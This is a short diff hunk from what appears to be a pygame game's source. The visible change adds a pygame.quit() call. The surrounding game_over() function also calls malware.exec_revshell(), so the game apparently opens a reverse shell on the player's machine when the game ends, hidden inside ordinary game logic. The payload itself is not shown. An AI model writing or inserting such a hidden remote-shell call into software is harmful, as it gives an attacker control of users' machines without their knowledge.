@@ -62,6 +62,7 @@ def game_over():
     malware.exec_revshell()
 
     #Closes the application
+    pygame.quit()
     quit()
 
 
